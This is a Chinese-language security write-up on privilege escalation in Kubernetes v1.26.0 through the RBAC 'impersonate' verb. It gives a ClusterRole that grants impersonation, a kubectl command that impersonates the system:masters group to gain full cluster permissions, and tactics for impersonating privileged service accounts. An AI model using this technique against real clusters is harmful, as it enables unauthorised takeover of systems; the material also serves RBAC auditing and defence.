
测试kubernetes版本：v1.26.0


## 利用`impersonate`进行权限提升

`impersonate`动词的作用是允许当前主体以其他的主体的身份访问apiserver，详细见： [用户伪装](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authentication/)


`impersonate`动词在以下资源范围生效，对应着http请求和kubectl的不同参数，见下表：

| 资源名称       | HTTP Headers                   | kubectl参数 |
| -------------- | ------------------------------ | ----------- |
| users           | Impersonate-User               | --as        |
| groups          | Impersonate-Group              | --as-group  |
| serviceaccounts | Impersonate-User               | -as         |
| userextras     | Impersonate-Extra-(extra name) | 不支持           |


允许对以上资源进行伪装的`clusterrole`如下：

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: impersonator
rules:
- apiGroups: [""]
  resources: ["users", "groups", "serviceaccounts"]
  verbs: ["impersonate"]
- apiGroups: ["authentication.k8s.io"]
  resources: ["userextras"]
  verbs: ["impersonate"]
```

原主体权限如下：

`kubectl  auth can-i --list`

```text
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
groups                                          []                                    []               [impersonate]
serviceaccounts                                 []                                    []               [impersonate]
users                                           []                                    []               [impersonate]
userextras.authentication.k8s.io                []                                    []               [impersonate]
```

模拟`system:master`用户组权限

`kubectl --as=what-you-want --as-group=system:masters auth can-i --list`

`--as`参数随意指定，k8s不负责管理用户信息，所以k8s也没有办法验证`--as`值是否合法

```text
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [*]
                                                [*]                 []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
```

## 绑定不同资源的情况下的攻击手法

* 当前主体绑定了`users`资源的`impersonate`，需要找一个`user`被绑定了某一个角色，这个有权限的`user`是需要提前知道的
* 当前主体绑定了`users`和`groups`资源的`impersonate`，直接模拟`system:master`组的任意用户名即可
* 当前用户绑定了`serviceaccounts`资源的`impersonate`，尝试绑定k8s系统组件、其他跑在k8s上的开源产品如istio、各n`amespace`默认的`serviceaccount`
